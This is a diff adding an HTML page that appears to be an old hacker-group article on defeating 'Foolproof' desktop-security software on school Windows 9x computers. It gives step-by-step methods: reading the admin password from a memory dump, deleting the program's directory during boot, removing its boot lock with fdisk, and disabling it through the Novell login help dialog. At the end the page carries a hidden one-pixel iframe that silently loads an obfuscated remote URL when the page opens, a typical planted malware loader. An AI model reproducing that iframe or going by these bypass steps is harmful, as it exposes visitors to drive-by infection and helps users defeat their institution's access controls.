@@ -1,0 +1,101 @@
+<html>
+<head>
+<title>foolproof</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+<body bgcolor="#000000" text="#ffffff" link="#ffffff" vlink="#ffffff">
+<div align="center">
+<table width="680" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr>
+    <td width="693">
+      <pre>
+                        :::::::::   ::::::::  :::::::::  ::::::::::
+                        :+:    :+: :+:    :+: :+:    :+: :+:
+                        +:+    +:+ +:+        +:+    +:+ +:+
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#
+                        +#+    +#+        +#+ +#+    +#+ +#+
+                        #+#    #+# #+#    #+# #+#    #+# #+#
+                        #########   ########  ###    ### ###
+
+              	             <a href="http://blacksun.box.sk" target="_blank">http://blacksun.box.sk</a>
+                           _____________________________
+    ______________________I       <b>   Topic:</b>             I_____________________
+   \                      I                             I                    /
+    \     HTML by:        I     <b>Is Foolproof Really</b>     I   Written by:     /
+    >                     I        <b>Foolproof?</b>           I                  <
+   /      <a href="mailto:black_mesa@hacktik.org">Martin L.</a>       I_____________________________I   QVCxQM          \
+  /___________________________>                    <_________________________\</pre>
+    </td>
+  </tr>
+</table>
+</div>
+<p>&nbsp;</p>
+<p>  Foolproof is a desktop security software used on Windows 9x platforms. Many school districts across the world are taking it on as
+  their only form of internal security. Unfortunately, the name has falsely made them believe that they are secure.</p>
+
+<p>  I was originally given the task of checking how secure this software was for my school district while I was in my final year of high
+  school. Upon sitting down at the machine you will notice that it loads a boot lock (won’t allow any "F" keys to be pressed unless a
+  password is entered and once you get to a Dos prompt you will notice that there isn’t anything on the drives. If you break out a copy of
+  Fdisk you will see that the boot lock program has changed the partitions into non-Dos partitions so they cannot be messed with). Once
+  you boot the computer into Windows the first thing this software does is load itself into every part of memory that your computer will
+  allow. This allows the software to prevent the use of certain programs that are specified in the settings by hogging all the memory
+  which will stop the it from loading because there is no memory left to bring the program up. Another thing noticed is the wonderful little
+  lock program down in your taskbar telling you the machine is locked (Doesn’t this just beg to be messed with?).</p>
+
+<p>  Now that I’ve given some background on the program, here comes the fun part. How to get around it.</p>
+
+<h4>1. 32-bit Software protection</h4>
+<p>oolproof is a 32-bit application. For some reason or another they didn’t program any 16-bit protection. If Foolproof has been setup to
+  block the visibility of some network drives all you have to do is go into the root of your windows folder and run ‘fileman.exe’ (I realize
+  this is stupid, but you wouldn’t believe how many school districts leave this one open). Once File Manager is open you should be able
+  to see and access all drives that you were locked out of in My Computer.</p>
+
+<h4>2. Password in plaintext?</h4>
+<p>This is another one I was never able to understand. If you are going to have such a secure program, why can you take a memory
+  dump of the machine and find the password in plain text? I’m not sure if this one works on newer versions, but on older versions you
+  just had to do a search in the memory and find ‘Foolpr’ (that was another thing, I don’t know if they thought it would be more secure if
+  they didn’t put the whole name or what, but that is how you find it). Usually there are two passwords you want to find. The one to get in
+  and change settings, and a password to a higher access level then what the machine boots up to.</p>
+<h4>3. Remove it</h4>
+<p>The best way to get rid of a program is to remove it. So this is how. When you are first booting and the background to Windows first
+  comes up hit ctrl-alt-del (Must be before anything loads. Ex. Boot logo just disappeared, background shows up, hit ctrl-alt-del). This will
+  bring up the Close Program dialog window. Now double click outside of the window a couple of times really quickly until Task Manager
+  comes up (you will learn that Task Manager can be your best friend in many situations. It may take you a couple of times to get Task
+  Manager up, but it will work eventually). From this point click on File and then Run Application. Type in "deltree /y C:SSS" (this is the
+  default directory to Foolproof. You might want to do some looking around before you decide this is the directory you want to completely
+  delete). At this point, some computers will freeze. It’s okay. Just hit ctrl-alt-del again and close down Task Manager or whatever
+  non-responding applications are open. Once they are closed the deltree operation should continue and delete the Foolproof directory
+  before the registry goes to load it. Once Windows finishes it’s loading process (whether you have to login to the network first or not,
+  load the desktop and startup applications, etc.) will be when the .dll errors will start happening. Write them down and remove them out
+  of the registry. Now Foolproof is removed far enough to allow you full access of the local machine and whatever kind of network
+  access your user possesses on the network.</p>
+<h4>4. Bootlock</h4>
+<p>Remember earlier where I mentioned that it turns all partitions into
+  Non-Dos partitions? Well, lets have some fun with this. There are two ways that I know of to remove Bootlock. First, if you have a copy
+  of Foolproof laying out on a shared network drive go grab it (it doesn’t matter if it has custom settings in it or not. If it doesn’t have
+  custom settings in it, then why are you reading this?). Run the installer for Foolproof. When it asks you if you wish to make an
+  emergency repair disk, say yes. Use this disk to get to a command prompt and then type ‘FPMOD -R’. This should remove Bootlock
+  for you so you can now have access to the Dos layer of your computer if you boot with a boot disk. The second way I know of getting
+  around Bootlock is also with a bootdisk. Make a bootdisk and put a copy of fdisk.exe and ndd.exe (found in older version of Norton
+  Utilities. Make sure it is the Dos version) on it. Boot the computer with the disk and Fdisk all the Non-Dos partitions. Exit out of Fdisk
+  and reboot with the disk still in the drive. Once you are back at the prompt again run ndd.exe. It will scan all hard drives and then come
+  up asking you if you used to have a hard drive but you aren’t able to access it now. Tell it yes and it should restore the partitions
+  without Bootlock.</p>
+<h4>5. Novell Client</h4>
+<p>If you are on a network where the Novell Netware Client is used, here is a good one for you. When at the Novell login screen hit F1.
+  This brings up the wonderful help system for the Novell client. Like most people that program help files, they are too lazy to take out the
+  features that aren’t needed. First go to File à Open. From this point find the Foolproof directory (usually C:SSS) and rename it to
+  whatever you want. Exit out of the help system and login to the network. Once you are at the desktop of your computer restart your
+  machine. When the computer boots back help you’ll get a couple of errors that have to do with Foolproof, but Foolproof will be gone.
+  Do whatever you wish to do with Foolproof turned off and when you are done just rename the directory back to its original name.
+  Wasn’t that simple?</p>
+
+
+<p>I’m sure there are many more ways to get around this sorry excuse for security software, but I haven’t had the time to try any new
+  methods. I figure if you got something that works, keep on using it till it doesn’t. I might write another article in the future, but this will be
+  it for now. Greetz out to CyberArmy, Packetstorm, Sensimilla, Monkee, and all my friends on Efnet.</p>
+
+
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
